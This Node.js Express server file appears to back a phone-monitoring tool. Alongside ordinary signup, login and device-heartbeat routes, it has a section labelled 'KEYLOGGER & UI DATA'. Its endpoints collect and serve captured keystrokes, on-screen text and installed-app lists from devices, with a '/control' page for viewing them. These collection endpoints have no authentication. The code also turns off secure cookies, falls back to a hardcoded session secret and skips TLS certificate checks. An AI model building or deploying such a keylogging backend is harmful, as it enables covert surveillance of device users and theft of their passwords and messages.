const express = require("express");
const path = require("path");
const { Pool } = require("pg");
const bcrypt = require("bcrypt");
const session = require("express-session");
const pgSession = require("connect-pg-simple")(session);
const crypto = require("crypto");

const app = express();
const PORT = process.env.PORT || 3000;

// TRUST PROXY FIX
app.set("trust proxy", 1);

// ================= DATABASE =================

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl:
    process.env.NODE_ENV === "production"
      ? { rejectUnauthorized: false }
      : false
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ================= SESSION =================

app.use(
  session({
    store: new pgSession({
      pool: pool,
      tableName: "user_sessions",
      createTableIfMissing: true
    }),

    secret:
      process.env.SESSION_SECRET ||
      "change-this-secret-in-render",

    resave: false,
    saveUninitialized: false,

    cookie: {
      httpOnly: true,
      secure: false, // ❗ FIX: Secure off
      sameSite: "lax",
      maxAge: 1000 * 60 * 60 * 24 * 7
    }
  })
);

// ================= DATABASE SETUP =================

async function setupDatabase() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS devices (
        id SERIAL PRIMARY KEY,
        user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
        device_token TEXT UNIQUE NOT NULL,
        device_name VARCHAR(255) NOT NULL,
        battery INTEGER DEFAULT 0,
        online BOOLEAN DEFAULT FALSE,
        last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);

    console.log("Database is ready.");
  } catch (error) {
    console.error("Database setup failed:", error);
  }
}

setupDatabase();

// ================= AUTH MIDDLEWARE =================

function requireLogin(req, res, next) {
  if (!req.session.userId) {
    return res.status(401).json({
      authenticated: false,
      error: "Login required."
    });
  }
  next();
}

// ================= HEALTH =================

app.get("/api/health", async (req, res) => {
  try {
    await pool.query("SELECT 1");
    res.json({ status: "ok", database: "connected" });
  } catch (error) {
    console.error(error);
    res.status(500).json({ status: "error", database: "connection failed" });
  }
});

// ================= SIGNUP =================

app.post("/api/signup", async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ error: "Email and password are required." });
    }
    if (password.length < 8) {
      return res.status(400).json({ error: "Password must be at least 8 characters." });
    }
    const normalizedEmail = email.trim().toLowerCase();
    const existingUser = await pool.query(
      "SELECT id FROM users WHERE email = $1",
      [normalizedEmail]
    );
    if (existingUser.rows.length > 0) {
      return res.status(409).json({ error: "An account with this email already exists." });
    }
    const passwordHash = await bcrypt.hash(password, 12);
    const result = await pool.query(
      "INSERT INTO users (email, password_hash) VALUES ($1, $2) RETURNING id, email, created_at",
      [normalizedEmail, passwordHash]
    );

    req.session.userId = result.rows[0].id;

    req.session.save((error) => {
      if (error) {
        console.error("Signup session save error:", error);
        return res.status(500).json({ error: "Unable to save session." });
      }
      res.status(201).json({
        message: "Account created successfully.",
        user: result.rows[0]
      });
    });

  } catch (error) {
    console.error("Signup error:", error);
    res.status(500).json({ error: "Unable to create account." });
  }
});

// ================= LOGIN =================

app.post("/api/login", async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ error: "Email and password are required." });
    }
    const normalizedEmail = email.trim().toLowerCase();
    const result = await pool.query(
      "SELECT id, email, password_hash FROM users WHERE email = $1",
      [normalizedEmail]
    );
    if (result.rows.length === 0) {
      return res.status(401).json({ error: "Invalid email or password." });
    }
    const user = result.rows[0];
    const passwordCorrect = await bcrypt.compare(password, user.password_hash);
    if (!passwordCorrect) {
      return res.status(401).json({ error: "Invalid email or password." });
    }

    req.session.userId = user.id;

    req.session.save((error) => {
      if (error) {
        console.error("Login session save error:", error);
        return res.status(500).json({ error: "Unable to save session." });
      }
      res.json({
        message: "Login successful.",
        user: { id: user.id, email: user.email }
      });
    });

  } catch (error) {
    console.error("Login error:", error);
    res.status(500).json({ error: "Unable to login." });
  }
});

// ================= CURRENT USER =================

app.get("/api/me", async (req, res) => {
  try {
    if (!req.session.userId) {
      return res.status(401).json({ authenticated: false });
    }
    const result = await pool.query(
      "SELECT id, email, created_at FROM users WHERE id = $1",
      [req.session.userId]
    );
    if (result.rows.length === 0) {
      return res.status(401).json({ authenticated: false });
    }
    res.json({ authenticated: true, user: result.rows[0] });
  } catch (error) {
    console.error("Session error:", error);
    res.status(500).json({ error: "Unable to check session." });
  }
});

// ================= DEVICE REGISTER =================

app.post("/api/devices/register", requireLogin, async (req, res) => {
  try {
    const { deviceName, battery } = req.body;
    if (!deviceName) {
      return res.status(400).json({ error: "Device name is required." });
    }
    const token = crypto.randomBytes(32).toString("hex");
    const safeBattery = Number.isInteger(Number(battery)) ? Math.max(0, Math.min(100, Number(battery))) : 0;
    const result = await pool.query(
      `INSERT INTO devices (user_id, device_token, device_name, battery, online, last_seen)
       VALUES ($1, $2, $3, $4, TRUE, CURRENT_TIMESTAMP)
       RETURNING id, device_name, battery, online, last_seen, created_at`,
      [req.session.userId, token, deviceName.trim(), safeBattery]
    );
    res.status(201).json({
      message: "Device registered successfully.",
      device: result.rows[0],
      deviceToken: token
    });
  } catch (error) {
    console.error("Device registration error:", error);
    res.status(500).json({ error: "Unable to register device." });
  }
});

// ================= DEVICE LIST =================

app.get("/api/devices", requireLogin, async (req, res) => {
  try {
    await pool.query(`
      UPDATE devices SET online = FALSE WHERE last_seen < NOW() - INTERVAL '2 minutes'
    `);
    const result = await pool.query(
      `SELECT id, device_name AS name, device_token, battery, online, last_seen, created_at
       FROM devices WHERE user_id = $1 ORDER BY created_at DESC`,
      [req.session.userId]
    );
    res.json(result.rows);
  } catch (error) {
    console.error("Device list error:", error);
    res.status(500).json({ error: "Unable to load devices." });
  }
});

// ================= DEVICE HEARTBEAT =================

app.post("/api/devices/heartbeat", async (req, res) => {
  try {
    const { deviceToken, battery } = req.body;
    if (!deviceToken) {
      return res.status(400).json({ error: "Device token is required." });
    }
    const safeBattery = Number.isInteger(Number(battery)) ? Math.max(0, Math.min(100, Number(battery))) : 0;
    const result = await pool.query(
      `UPDATE devices SET battery = $1, online = TRUE, last_seen = CURRENT_TIMESTAMP
       WHERE device_token = $2 RETURNING id, device_name, battery, online, last_seen`,
      [safeBattery, deviceToken]
    );
    if (result.rows.length === 0) {
      return res.status(404).json({ error: "Device not found." });
    }
    res.json({ message: "Heartbeat received.", device: result.rows[0] });
  } catch (error) {
    console.error("Heartbeat error:", error);
    res.status(500).json({ error: "Unable to update device." });
  }
});

// ================= SINGLE DEVICE =================

app.get("/api/devices/:id", requireLogin, async (req, res) => {
  try {
    const result = await pool.query(
      `SELECT id, device_name AS name, battery, online, last_seen, created_at
       FROM devices WHERE id = $1 AND user_id = $2`,
      [req.params.id, req.session.userId]
    );
    if (result.rows.length === 0) {
      return res.status(404).json({ error: "Device not found." });
    }
    res.json(result.rows[0]);
  } catch (error) {
    console.error("Device error:", error);
    res.status(500).json({ error: "Unable to load device." });
  }
});

// ================= KEYLOGGER & UI DATA =================

const keylogs = [];
const deviceUIs = new Map();

app.post("/api/keylog", async (req, res) => {
  try {
    const { deviceId, text, timestamp } = req.body;
    if (!deviceId || !text) {
      return res.status(400).json({ error: "deviceId and text required" });
    }
    keylogs.push({ deviceId, text, timestamp: timestamp || Date.now() });
    res.json({ success: true });
  } catch (error) {
    console.error("Keylog error:", error);
    res.status(500).json({ error: "Unable to save keylog" });
  }
});

app.post("/api/ui", async (req, res) => {
  try {
    const { deviceId, uiText, timestamp } = req.body;
    if (!deviceId) return res.status(400).json({ error: "deviceId required" });
    deviceUIs.set(deviceId, { uiText, timestamp: timestamp || Date.now() });
    res.json({ success: true });
  } catch (error) {
    console.error("UI error:", error);
    res.status(500).json({ error: "Unable to save UI data" });
  }
});

app.get("/api/keylog", async (req, res) => {
  try {
    const { deviceId } = req.query;
    if (!deviceId) return res.status(400).json({ error: "deviceId required" });
    const logs = keylogs.filter(log => log.deviceId === deviceId);
    res.json(logs);
  } catch (error) {
    console.error("Get keylog error:", error);
    res.status(500).json({ error: "Unable to get keylogs" });
  }
});

app.get("/api/ui", async (req, res) => {
  try {
    const { deviceId } = req.query;
    if (!deviceId) return res.status(400).json({ error: "deviceId required" });
    const data = deviceUIs.get(deviceId);
    if (!data) return res.json({ uiText: "", timestamp: 0 });
    res.json(data);
  } catch (error) {
    console.error("Get UI error:", error);
    res.status(500).json({ error: "Unable to get UI data" });
  }
});

// ================= DEVICE STATE (Real Info) =================

const deviceStates = new Map();

app.post("/api/device-state", async (req, res) => {
  try {
    const { deviceId, deviceName, battery, installedApps } = req.body;
    if (!deviceId) return res.status(400).json({ error: "deviceId required" });

    deviceStates.set(deviceId, {
      deviceName: deviceName || "Unknown Device",
      battery: battery ?? 0,
      installedApps: installedApps || [],
      last_seen: Date.now()
    });

    res.json({ success: true });
  } catch (error) {
    console.error("Device state error:", error);
    res.status(500).json({ error: "Unable to save device state" });
  }
});

app.get("/api/device-state", async (req, res) => {
  try {
    const { deviceId } = req.query;
    if (!deviceId) return res.status(400).json({ error: "deviceId required" });

    const data = deviceStates.get(deviceId);
    if (!data) return res.json({ deviceName: "Unknown", battery: 0, installedApps: [], last_seen: 0 });

    res.json(data);
  } catch (error) {
    console.error("Get device state error:", error);
    res.status(500).json({ error: "Unable to get device state" });
  }
});

// ================= CONTROL PAGE =================

app.get("/control.html", requireLogin, (req, res) => {
  res.sendFile(path.join(__dirname, "control.html"));
});

app.get("/control", requireLogin, (req, res) => {
  res.sendFile(path.join(__dirname, "control.html"));
});

// ================= LOGOUT =================

app.post("/api/logout", (req, res) => {
  req.session.destroy((error) => {
    if (error) {
      console.error(error);
      return res.status(500).json({ error: "Unable to logout." });
    }
    res.clearCookie("connect.sid");
    res.json({ message: "Logged out successfully." });
  });
});

// ================= WEBSITE =================

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.get("/login.html", (req, res) => {
  res.sendFile(path.join(__dirname, "login.html"));
});

app.get("/login", (req, res) => {
  res.sendFile(path.join(__dirname, "login.html"));
});

app.get("/dashboard.html", (req, res) => {
  res.sendFile(path.join(__dirname, "dashboard.html"));
});

app.get("/dashboard", (req, res) => {
  res.sendFile(path.join(__dirname, "dashboard.html"));
});

// ================= SERVER =================

app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running on port ${PORT}`);
});
